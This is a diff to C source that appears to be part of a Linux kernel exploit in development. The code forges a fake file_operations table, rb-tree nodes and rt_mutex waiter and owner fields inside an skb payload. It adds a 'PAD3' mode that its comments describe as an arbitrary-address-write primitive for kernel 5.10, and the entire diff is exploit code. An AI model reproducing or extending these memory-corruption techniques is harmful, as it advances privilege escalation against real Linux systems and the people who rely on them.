@@ -429,7 +429,8 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
                 env_flag("MODE4_WRITE_PROOF", 0) ||
                 env_flag("MODE4_FOPS_SLOT", 0) ||
                 env_flag("MODE4_KIMAGE_MISC", 0) ||
-                env_flag("MODE4_P0_MISC", 0);
+                env_flag("MODE4_P0_MISC", 0) ||
+                env_flag("MODE4_PAD3", 0);
   if (rb_leaf) {
     put64(p, off + 0x00, 1); /* BLACK, parent NULL */
     put64(p, off + 0x08, 0); /* rb_right / llseek NULL */
@@ -854,22 +855,24 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       if (chunk == 0)
         pr_info("mode4 LOCK_EMPTY waiters=0 owner=0 (isolation)\n");
     } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
-               (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0))) {
+               (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0) ||
+                env_flag("MODE4_PAD3", 0))) {
       /*
-       * aristotle: owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase,
+       * aristotle / PAD3: owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase,
        * skip fragile fake_task setprio. waiters root = W0 empty leaf.
+       * PAD3 is only-left AAW (same class as bootid write-proof).
        */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
       put64(p, LOCK_OFF + 0x18, 1);
       if (chunk == 0)
-        pr_info("mode4 ARISTOTLE lock.waiters=W0 owner=1 (clean exit after "
+        pr_info("mode4 ARISTOTLE/PAD3 lock.waiters=W0 owner=1 (clean exit after "
                 "erase; no fake_task boost)\n");
     } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
                (env_flag("MODE4_LOCK_OWNER0", 0) || env_flag("MODE4_CHAIN", 0) ||
-                env_flag("MODE4_ZION", 0) || env_flag("MODE4_ION_SAFE", 0) ||
-                env_flag("MODE4_ZERO_NAME", 0) || env_flag("MODE4_ZERO_OWNER", 0) ||
-                env_flag("MODE4_FOPS_SLOT", 0))) {
+                env_flag("MODE4_ZION", 0) ||
+                env_flag("MODE4_ION_SAFE", 0) || env_flag("MODE4_ZERO_NAME", 0) ||
+                env_flag("MODE4_ZERO_OWNER", 0) || env_flag("MODE4_FOPS_SLOT", 0))) {
       /*
        * 5.10 adjust after dequeue: if owner==NULL, skip fake_task setprio path.
        * Keep waiters=W0 so top_waiter stays W0 when stack prio is worse (higher
